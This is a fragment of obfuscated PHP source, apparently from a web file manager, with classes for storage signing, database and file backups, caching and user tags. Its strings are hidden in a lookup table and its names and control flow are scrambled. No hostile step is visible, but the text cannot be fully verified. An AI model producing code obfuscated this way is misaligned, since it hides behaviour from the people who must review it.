"\x3c\120\141\162\164\x4e\x75\155\142\145\x72\x3e{$°ÒˆèÛç[$èÆÏ‚’[1415]]}\x3c\x2f\x50\141\x72\x74\116\x75\x6d\x62\x65\162\x3e\xa" . "\74\105\x54\x61\x67\x3e{$°ÒˆèÛç[$èÆÏ‚’[1416]]}\74\57\x45\x54\x61\147\x3e\xa" . $èÆÏ‚’[1462]; } $®Ù€ö‹° .= $èÆÏ‚’[1463]; $ÂÙ”…Ø³ = array(); $¸ó ãåˆ = explode($èÆÏ‚’[194], $this->getHost()); $İƒâÏ¶ = array($èÆÏ‚’[1457] => $¸ó ãåˆ[1], $èÆÏ‚’[225] => $èÆÏ‚’[130], $èÆÏ‚’[269] => strlen($®Ù€ö‹°)); $—èö¼¾× = $èÆÏ‚’[236]; $¬Ö€³âĞ = $èÆÏ‚’[8] . $this->pathEncode($§çñ¦Óù) . $™ØøÀÉç[$èÆÏ‚’[184]]; $å„¾©éË = $this->client->__getSignatureV4($ÂÙ”…Ø³, $İƒâÏ¶, $—èö¼¾×, $¬Ö€³âĞ, $®Ù€ö‹°); return array($èÆÏ‚’[243] => $å„¾©éË[$èÆÏ‚’[243]], $èÆÏ‚’[234] => $å„¾©éË[$èÆÏ‚’[1459]], $èÆÏ‚’[245] => $äâƒôğŠ, $èÆÏ‚’[1456] => $å„¾©éË[$èÆÏ‚’[1456]]); } public function link($Íê¬óâ, $ªÏ×ë’­ = array()) { return parent::link($Íê¬óâ, $ªÏ×ë’­); } public function fileOut($¿ŒœÂ… , $²£à¾Ìû = false, $ÜèÇ‰® = false, $ğã›ª…Ï = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ªÏ§Ë·][1464])) { return parent::fileOutServer($¿ŒœÂ… , $²£à¾Ìû, $ÜèÇ‰®, $ğã›ª…Ï); } parent::fileOut($¿ŒœÂ… , $²£à¾Ìû, $ÜèÇ‰®, $ğã›ª…Ï); } public function fileOutImage($£ã‡‚Ë”, $ı“ºœ¸â = 250) { if (strstr($this->endpoint, $_SERVER[ªÏ§Ë·][1464])) { return parent::fileOutImageServer($£ã‡‚Ë”, $ı“ºœ¸â); } parent::fileOutImage($£ã‡‚Ë”, $ı“ºœ¸â); } public function fileOutLink($í¯·ÓïÄ) { $Ó«ç°ÒÚ =& $_SERVER[ªÏ§Ë·]; if (substr($í¯·ÓïÄ, 0, 7) == $Ó«ç°ÒÚ[1356]) { $í¯·ÓïÄ = $Ó«ç°ÒÚ[1357] . substr($í¯·ÓïÄ, 7); } header($Ó«ç°ÒÚ[171] . $í¯·ÓïÄ); die; } public function getHost() { $Ó«¸ª£› =& $_SERVER[ªÏ§Ë·]; $§„È‚à = str_rtrim(parent::getHost(), $Ó«¸ª£›[8] . $this->bucket); $§„È‚à = explode($Ó«¸ª£›[194], $§„È‚à); return $§„È‚à[0] . $Ó«¸ª£›[194] . $this->bucket . $Ó«¸ª£›[10] . $§„È‚à[1]; } } goto d…Œ‚ªÉÊ; EêàĞØ‹õ”: class BackupDbFile { public function __construct() { } public function index() { $˜ºƒ¥ó  =& $_SERVER[ªÏ§Ë·]; $îÓøÜ§¹ = Backup::get(); $ê¦““º = $îÓøÜ§¹[$˜ºƒ¥ó [42]]; $×‘ŠúÔ = $this->tmpFilesPath() . "\x62\141\x63\153\x75\160\x5f{$ê¦““º}\57"; $ß“Ÿï‘ú = $this->backupPath($îÓøÜ§¹); if (!($ß“Ÿï‘ú = IO::mkdir($ß“Ÿï‘ú))) { return !1; } $³®ÉáÍ = IO::listPath($×‘ŠúÔ); $«˜—ûŠ = isset($³®ÉáÍ[$˜ºƒ¥ó [93]]) ? $³®ÉáÍ[$˜ºƒ¥ó [93]] : array(); $°”½¬Îí = array_sum(array_column($«˜—ûŠ, $˜ºƒ¥ó [86])); if (!$°”½¬Îí) { return !1; } $øèí¤³ç = array($˜ºƒ¥ó [826] => $°”½¬Îí, $˜ºƒ¥ó [827] => time()); Backup::set($øèí¤³ç); $æ¾çÎœ´ = new TaskFileTransfer($˜ºƒ¥ó [828], $˜ºƒ¥ó [808], count($«˜—ûŠ), LNG($˜ºƒ¥ó [809]) . $˜ºƒ¥ó [424] . LNG($˜ºƒ¥ó [811]) . $˜ºƒ¥ó [829]); $æ¾çÎœ´->task[$˜ºƒ¥ó [791]] = $°”½¬Îí; foreach ($³®ÉáÍ[$˜ºƒ¥ó [93]] as $Î£ŸğÛ) { $Ò²ÛêöÊ = IO::move($Î£ŸğÛ[$˜ºƒ¥ó [94]], $ß“Ÿï‘ú); if (!$Ò²ÛêöÊ) { $æ¾çÎœ´->end(); $Üø€ÖÀ¶ = IO::getLastError($˜ºƒ¥ó [830] . $Î£ŸğÛ[$˜ºƒ¥ó [94]] . $˜ºƒ¥ó [831] . $ß“Ÿï‘ú . $˜ºƒ¥ó [174]); write_log($Üø€ÖÀ¶, $˜ºƒ¥ó [808]); return !1; } } $™¼õá’Á = new DbManage(); $Ô›¸ïÏæ = $™¼õá’Á->getSqlFile(); if (!$Ô›¸ïÏæ[$˜ºƒ¥ó [832]] || !$Ô›¸ïÏæ[$˜ºƒ¥ó [23]]) { return !1; } IO::move($Ô›¸ïÏæ[$˜ºƒ¥ó [832]], $ß“Ÿï‘ú); IO::move($Ô›¸ïÏæ[$˜ºƒ¥ó [23]], $ß“Ÿï‘ú); $æ¾çÎœ´->end(); $øèí¤³ç = array($˜ºƒ¥ó [833] => $°”½¬Îí, $˜ºƒ¥ó [834] => time()); Backup::set($øèí¤³ç); return !0; } private function backupPath($Óç×ºŸ) { $Ğ¯¼Ìá­ =& $_SERVER[ªÏ§Ë·]; $èèí®±¶ = $Óç×ºŸ[$Ğ¯¼Ìá­[42]]; $Ù­¯“â = Model($Ğ¯¼Ìá­[798])->get($Ğ¯¼Ìá­[799]); $‹¢•îç = substr(md5($Ğ¯¼Ìá­[800] . $Ù­¯“â . $èèí®±¶), 0, 8); return "\173\151\x6f\x3a{$Óç×ºŸ[$Ğ¯¼Ìá­[779]]}\175\57\x64\x61\x74\141\142\141\163\x65\57\x62\141\x63\153\165\160\x2f" . $èèí®±¶ . $Ğ¯¼Ìá­[11] . $‹¢•îç; } private function tmpFilesPath() { $†ĞçÓˆ  =& $_SERVER[ªÏ§Ë·]; $ôŸŞÕíè = TEMP_FILES; if ($GLOBALS[$†ĞçÓˆ [6]][$†ĞçÓˆ [99]][$†ĞçÓˆ [824]]) { $ôŸŞÕíè = $GLOBALS[$†ĞçÓˆ [6]][$†ĞçÓˆ [99]][$†ĞçÓˆ [824]]; if (!mk_dir($ôŸŞÕíè) || !is_writable($ôŸŞÕíè) || !IO::mkfile($ôŸŞÕíè . $†ĞçÓˆ [825])) { $ôŸŞÕíè = TEMP_FILES; } } return $ôŸŞÕíè; } } class BackupFile { public function __construct() { } public function index() { $È¤õá›Ú = Backup::get(); $¢ª¶µ˜ = $È¤õá›Ú[$_SERVER[ªÏ§Ë·][331]][$_SERVER[ªÏ§Ë·][210]][$_SERVER[ªÏ§Ë·][506]]; $«éç’¡’ = array($_SERVER[ªÏ§Ë·][507] => array($_SERVER[ªÏ§Ë·][835], $¢ª¶µ˜), $_SERVER[ªÏ§Ë·][836] => array($_SERVER[ªÏ§Ë·][369], $È¤õá›Ú[$_SERVER[ªÏ§Ë·][779]])); $©Ó Ö–¹ = (int) Model($_SERVER[ªÏ§Ë·][817])->where($«éç’¡’)->count($_SERVER[ªÏ§Ë·][506]); $¶‰ˆÇ‚Ş = (int) Model($_SERVER[ªÏ§Ë·][817])->where($«éç’¡’)->sum($_SERVER[ªÏ§Ë·][86]); $Š¾‰¥ìæ = new TaskFileTransfer($_SERVER[ªÏ§Ë·][837], $_SERVER[ªÏ§Ë·][808], $©Ó Ö–¹, LNG($_SERVER[ªÏ§Ë·][809]) . $_SERVER[ªÏ§Ë·][810] . LNG($_SERVER[ªÏ§Ë·][838])); $Š¾‰¥ìæ->task[$_SERVER[ªÏ§Ë·][791]] = $¶‰ˆÇ‚Ş; $£ùò€ª = array($_SERVER[ªÏ§Ë·][839] => $©Ó Ö–¹, $_SERVER[ªÏ§Ë·][840] => $¶‰ˆÇ‚Ş, $_SERVER[ªÏ§Ë·][841] => time()); Backup::set($£ùò€ª); $¹·ã¿ºú = !0; $ŒÆ«¿Ñ = $this->storeIds(); $ğøÆµæ‘ = 1; $Ñû¼«¶ƒ = 1000; $‡¯íüÊ¢ = $ú¢÷š• = 0; $ ¤ôõæÛ = array(); $áÁ–ºå¸ = $Çì°Ü = 0; do { $»çÄˆ‚Ø = $_SERVER[ªÏ§Ë·][842]; $ğÂ¾ñİÏ = Model($_SERVER[ªÏ§Ë·][817])->where($«éç’¡’)->field($»çÄˆ‚Ø)->order($_SERVER[ªÏ§Ë·][843])->selectPage($Ñû¼«¶ƒ, $ğøÆµæ‘); $Äˆƒá = !empty($ğÂ¾ñİÏ[$_SERVER[ªÏ§Ë·][407]]) ? $ğÂ¾ñİÏ[$_SERVER[ªÏ§Ë·][407]] : array(); foreach ($Äˆƒá as $úİßõì) { if (!$this->_fileExist($úİßõì, $ ¤ôõæÛ, $ŒÆ«¿Ñ)) { $©Ó Ö–¹ -= 1; $¶‰ˆÇ‚Ş -= (int) $úİßõì[$_SERVER[ªÏ§Ë·][86]]; write_log("\x66\151\x6c\145\40\x6e\157\164\x20\145\x78\151\163\x74\56\x66\x69\x6c\x65\111\x44\x3a{$úİßõì[$_SERVER[ªÏ§Ë·][506]]}\x2c\40\160\x61\164\150\72{$úİßõì[$_SERVER[ªÏ§Ë·][94]]}", $_SERVER[ªÏ§Ë·][844]); continue; } $Ñ³ùàª’ = $úİßõì[$_SERVER[ªÏ§Ë·][94]]; $ïÁÙ–Ëî = "\173\151\x6f\72{$È¤õá›Ú[$_SERVER[ªÏ§Ë·][779]]}\x7d" . substr($Ñ³ùàª’, strlen("\173\x69\157\72{$úİßõì[$_SERVER[ªÏ§Ë·][845]]}\x7d")); if (IO::exist($ïÁÙ–Ëî)) { $Š¾‰¥ìæ->updateFileEnd($úİßõì[$_SERVER[ªÏ§Ë·][42]], $úİßõì[$_SERVER[ªÏ§Ë·][86]]); } else { $ïÁÙ–Ëî = get_path_father($ïÁÙ–Ëî); IO::mkdir($ïÁÙ–Ëî); if (!IO::copy($Ñ³ùàª’, $ïÁÙ–Ëî, $_SERVER[ªÏ§Ë·][846])) { write_log($_SERVER[ªÏ§Ë·][847] . $Ñ³ùàª’ . $_SERVER[ªÏ§Ë·][831] . $ïÁÙ–Ëî . $_SERVER[ªÏ§Ë·][174], $_SERVER[ªÏ§Ë·][808]); $¹·ã¿ºú = !1; break; } } $¢ª¶µ˜ = $úİßõì[$_SERVER[ªÏ§Ë·][506]]; $ú¢÷š• += 1; $‡¯íüÊ¢ += $úİßõì[$_SERVER[ªÏ§Ë·][86]]; $Çì°Ü += 1; $áÁ–ºå¸ += $úİßõì[$_SERVER[ªÏ§Ë·][86]]; if ($‡¯íüÊ¢ >= 1024 * 1024 * 100) { $£ùò€ª = array($_SERVER[ªÏ§Ë·][848] => $¢ª¶µ˜, $_SERVER[ªÏ§Ë·][849] => $Çì°Ü, $_SERVER[ªÏ§Ë·][850] => $áÁ–ºå¸); Backup::set($£ùò€ª); $‡¯íüÊ¢ = $ú¢÷š• = 0; } } $â”¶©Ø = count($Äˆƒá); $ğøÆµæ‘++; } while ($â”¶©Ø == $Ñû¼«¶ƒ); $Š¾‰¥ìæ->end(); $£ùò€ª = array($_SERVER[ªÏ§Ë·][851] => 1, $_SERVER[ªÏ§Ë·][789] => time(), $_SERVER[ªÏ§Ë·][803] => 1, $_SERVER[ªÏ§Ë·][848] => $¢ª¶µ˜, $_SERVER[ªÏ§Ë·][840] => $¶‰ˆÇ‚Ş, $_SERVER[ªÏ§Ë·][839] => $©Ó Ö–¹, $_SERVER[ªÏ§Ë·][852] => time()); if ($ú¢÷š•) { $£ùò€ª[$_SERVER[ªÏ§Ë·][849]] = $Çì°Ü; $£ùò€ª[$_SERVER[ªÏ§Ë·][850]] = $áÁ–ºå¸; } Backup::set($£ùò€ª); $this->_fileFilter($ ¤ôõæÛ); return !0; } private function _fileExist($–ç¨ıÑÌ, &$ïã‘Ñİ´, $ÒéÍ•³) { $‹ÁĞº¢ =& $_SERVER[ªÏ§Ë·]; $­ÂŒêÑ = $–ç¨ıÑÌ[$‹ÁĞº¢[94]]; if (in_array($–ç¨ıÑÌ[$‹ÁĞº¢[506]], $ïã‘Ñİ´)) { return !1; } if (!in_array($–ç¨ıÑÌ[$‹ÁĞº¢[845]], $ÒéÍ•³)) { return !1; } if (IO::exist($­ÂŒêÑ)) { return !0; } $—ÈÃŠì‰ = get_path_father($­ÂŒêÑ); if (IO::exist($—ÈÃŠì‰)) { $ïã‘Ñİ´[] = $–ç¨ıÑÌ[$‹ÁĞº¢[506]]; return !1; } $§ë¢¦ = array($‹ÁĞº¢[845] => $–ç¨ıÑÌ[$‹ÁĞº¢[845]], $‹ÁĞº¢[94] => array($‹ÁĞº¢[421], "{$—ÈÃŠì‰}\45")); $€¯„Î¯‘ = Model($‹ÁĞº¢[817])->where($§ë¢¦)->field($‹ÁĞº¢[507])->select(); $ïã‘Ñİ´ = array_merge($ïã‘Ñİ´, array_to_keyvalue($€¯„Î¯‘, $‹ÁĞº¢[12], $‹ÁĞº¢[506])); return !1; } private function _fileFilter($Ÿ¼Üú¤) { $Ö‰İÃ“ì =& $_SERVER[ªÏ§Ë·]; if (empty($Ÿ¼Üú¤)) { return; } $£ë‹¾ÒŠ = array($Ö‰İÃ“ì[506] => array($Ö‰İÃ“ì[7], array_unique($Ÿ¼Üú¤))); $Ú¿„×·Ë = Model($Ö‰İÃ“ì[853])->where($£ë‹¾ÒŠ)->field($Ö‰İÃ“ì[440])->select(); foreach ($Ú¿„×·Ë as $œÔåú••) { Model($Ö‰İÃ“ì[853])->remove($œÔåú••[$Ö‰İÃ“ì[440]], !1); } } private function storeIds() { $²¾®ŸÚâ =& $_SERVER[ªÏ§Ë·]; $–ÄóÚÀ = Model($²¾®ŸÚâ[795])->listData(); $šŸÂ·á¨ = array(); $ÊİÛËë = $GLOBALS[$²¾®ŸÚâ[6]][$²¾®ŸÚâ[99]][$²¾®ŸÚâ[854]]; foreach ($–ÄóÚÀ as $œËš‘ËÓ) { $ıàÁò¿ = strtolower($œËš‘ËÓ[$²¾®ŸÚâ[105]]); if (!isset($ÊİÛËë[$ıàÁò¿])) { continue; } $¶Ïõ¤°ë = $²¾®ŸÚâ[84] . (isset($ÊİÛËë[$ıàÁò¿]) ? $ÊİÛËë[$ıàÁò¿] : ucfirst($ıàÁò¿)); if (!class_exists($¶Ïõ¤°ë)) { continue; } $šŸÂ·á¨[] = $œËš‘ËÓ[$²¾®ŸÚâ[437]]; } return $šŸÂ·á¨; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $®±Ÿ»µİ =& $_SERVER[ªÏ§Ë·]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¨û„»¦ = $GLOBALS[$®±Ÿ»µİ[6]][$®±Ÿ»µİ[387]]; $ÒÈİÓ÷ë = $¨û„»¦[$¨û„»¦[$®±Ÿ»µİ[855]]]; $Ô Ğ™ = $¨û„»¦[$®±Ÿ»µİ[856]]; switch ($¨û„»¦[$®±Ÿ»µİ[855]]) { case $®±Ÿ»µİ[31]: self::$handle = Model($®±Ÿ»µİ[857]); break; case $®±Ÿ»µİ[858]: self::$handle = new CacheRedis($ÒÈİÓ÷ë, $Ô Ğ™); break; case $®±Ÿ»µİ[859]: self::$handle = new CacheMemcached($ÒÈİÓ÷ë, $Ô Ğ™); break; case $®±Ÿ»µİ[210]: self::$handle = new CacheFile($ÒÈİÓ÷ë, $Ô Ğ™); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŒƒûÀÒ¶) { if (is_array($ŒƒûÀÒ¶) || is_object($ŒƒûÀÒ¶)) { $ŒƒûÀÒ¶ = json_encode($ŒƒûÀÒ¶); } $ŒƒûÀÒ¶ = rawurlencode($ŒƒûÀÒ¶); return md5(KOD_SITE_ID . $_SERVER[ªÏ§Ë·][11] . $ŒƒûÀÒ¶); } public static function get($Ï¦´‰“µ, $ª­œ¤­ã = false) { $·½şÀ = self::key($Ï¦´‰“µ); if ($ª­œ¤­ã) { return unserialize(self::init()->get($·½şÀ)); } if (!isset(self::$memoryCache[$·½şÀ])) { $ã¦ÜÎ¥ó = self::init()->get($·½şÀ); self::$memoryCache[$·½şÀ] = unserialize($ã¦ÜÎ¥ó); } return self::$memoryCache[$·½şÀ]; } public static function set($Ú„à«®³, $±£“ŸÏ, $°ŞÙ¾è = false) { $¢ ©¨Ï’ = self::key($Ú„à«®³); if (isset(self::$memoryCache[$¢ ©¨Ï’]) && self::$memoryCache[$¢ ©¨Ï’] === $±£“ŸÏ) { return !0; } if ($°ŞÙ¾è === 0) { self::$memoryCache[$¢ ©¨Ï’] = $±£“ŸÏ; return !0; } CacheLock::lock($Ú„à«®³); $íä²¹¦¥ = self::init()->set($¢ ©¨Ï’, serialize($±£“ŸÏ), $°ŞÙ¾è); self::$memoryCache[$¢ ©¨Ï’] = $±£“ŸÏ; CacheLock::unlock($Ú„à«®³); return $íä²¹¦¥; } public static function getCall($˜»€ìŞÉ, $»¦Ãªûİ, $ÒİÑ¥ÆÈ, $’ò¡ë©â = array()) { $»Ø²®Œù =& $_SERVER[ªÏ§Ë·]; $ÏİŠİŒ = self::get($˜»€ìŞÉ); if ($ÏİŠİŒ || $ÏİŠİŒ === $»Ø²®Œù[12]) { return $ÏİŠİŒ; } $ÏİŠİŒ = call_user_func_array($ÒİÑ¥ÆÈ, $’ò¡ë©â); $ÏİŠİŒ = $ÏİŠİŒ ? $ÏİŠİŒ : $»Ø²®Œù[12]; self::set($˜»€ìŞÉ, $ÏİŠİŒ, $»¦Ãªûİ); return $ÏİŠİŒ; } public static function remove($Ç³ôğæĞ) { $‡ÂÃŸ°ù = self::key($Ç³ôğæĞ); unset(self::$memoryCache[$‡ÂÃŸ°ù]); self::clearTimeout(); CacheLock::lock($Ç³ôğæĞ); $³£Î¼Ôí = self::init()->remove($‡ÂÃŸ°ù); CacheLock::unlock($Ç³ôğæĞ); return $³£Î¼Ôí; } public static function removeMemory($ÍÕ­‚”æ) { $…éÒ®ºŒ = self::key($ÍÕ­‚”æ); unset(self::$memoryCache[$…éÒ®ºŒ]); } public static function clearMemory($ëå¬š£Á = false) { if ($ëå¬š£Á) { $ëå¬š£Á = self::key($ëå¬š£Á); unset(self::$memoryCache[$ëå¬š£Á]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ªÏ§Ë·][860])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ªÏ§Ë·][861])) { self::init()->clearTimeout(); } } } goto b…ö¤±…¹ñ; CÉİšËùà: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($àÛªÛÂ‹) { $³õÌå¬ =& $_SERVER[ªÏ§Ë·]; return array($³õÌå¬[1968] => array($³õÌå¬[2352] . USER_ID, $³õÌå¬[1969])); } protected function listData() { $ßğ»Èì¤ =& $_SERVER[ªÏ§Ë·]; $×šËî¼¸ = array($ßğ»Èì¤[1658] => USER_ID, $ßğ»Èì¤[521] => array($ßğ»Èì¤[1972], 0)); $Üê¨Ù² = $ßğ»Èì¤[2353]; $–›†ıİ = $this->field($Üê¨Ù²)->where($×šËî¼¸)->order($ßğ»Èì¤[1975])->select(); return $–›†ıİ ? $–›†ıİ : array(); } protected function addToTag($ÙóÈº£İ, $´á¯¥Šó) { $Ò÷‰‹‹¨ =& $_SERVER[ªÏ§Ë·]; if (!Model($Ò÷‰‹‹¨[2117])->listData($´á¯¥Šó)) { return !1; } if (is_numeric($ÙóÈº£İ)) { $·ªßÃÌ = Model($Ò÷‰‹‹¨[853])->pathInfo($ÙóÈº£İ); if (!$·ªßÃÌ) { return !1; } } else { $·ªßÃÌ = IO::infoSimple($ÙóÈº£İ); if (!$·ªßÃÌ) { return !1; } $†ªÇ¾‘Ä = $·ªßÃÌ[$Ò÷‰‹‹¨[42]]; $ª„Ô£ç = $·ªßÃÌ[$Ò÷‰‹‹¨[43]]; if (isset($·ªßÃÌ[$Ò÷‰‹‹¨[448]])) { $ª„Ô£ç = $·ªßÃÌ[$Ò÷‰‹‹¨[448]] == $Ò÷‰‹‹¨[98] ? $Ò÷‰‹‹¨[85] : $Ò÷‰‹‹¨[210]; } } $ƒŸÑ‹ª = array($Ò÷‰‹‹¨[1658] => USER_ID, $Ò÷‰‹‹¨[521] => $´á¯¥Šó, $Ò÷‰‹‹¨[459] => $ÙóÈº£İ, $Ò÷‰‹‹¨[460] => $ª„Ô£ç ? $ª„Ô£ç : $Ò÷‰‹‹¨[454], $Ò÷‰‹‹¨[458] => $†ªÇ¾‘Ä ? $†ªÇ¾‘Ä : $Ò÷‰‹‹¨[12], $Ò÷‰‹‹¨[1861] => 0); if ($this->where($ƒŸÑ‹ª)->find()) { return !1; } return $this->add($ƒŸÑ‹ª); } protected function removeFromTag($ŸÄµÌÎë, $ĞÃºä¬) { $ñ¿ÎØ›¢ =& $_SERVER[ªÏ§Ë·]; if (!Model($ñ¿ÎØ›¢[2117])->listData($ĞÃºä¬)) { return !1; } if (is_array($ŸÄµÌÎë)) { $ŸÄµÌÎë = array($ñ¿ÎØ›¢[7], $ŸÄµÌÎë); } $¬‚Ç¬ŠÇ = array($ñ¿ÎØ›¢[1658] => USER_ID, $ñ¿ÎØ›¢[521] => $ĞÃºä¬, $ñ¿ÎØ›¢[459] => $ŸÄµÌÎë); return $this->where($¬‚Ç¬ŠÇ)->delete(); } protected function removeByTag($Š Å‡‹´) { $Éó¶Ò ğ =& $_SERVER[ªÏ§Ë·]; if (!$Š Å‡‹´) { return !1; } $ª“×Û©… = array($Éó¶Ò ğ[1658] => USER_ID, $Éó¶Ò ğ[521] => $Š Å‡‹´); return $this->where($ª“×Û©…)->delete(); } protected function removeBySource($ıì©ò²‚) { $ãÇÔ÷Êõ =& $_SERVER[ªÏ§Ë·]; if (is_array($ıì©ò²‚)) { $ıì©ò²‚ = array($ãÇÔ÷Êõ[7], $ıì©ò²‚); } $‘Ÿæ†Šî = array($ãÇÔ÷Êõ[1658] => USER_ID, $ãÇÔ÷Êõ[521] => array($ãÇÔ÷Êõ[1039], 0), $ãÇÔ÷Êõ[459] => $ıì©ò²‚); return $this->where($‘Ÿæ†Šî)->delete(); } }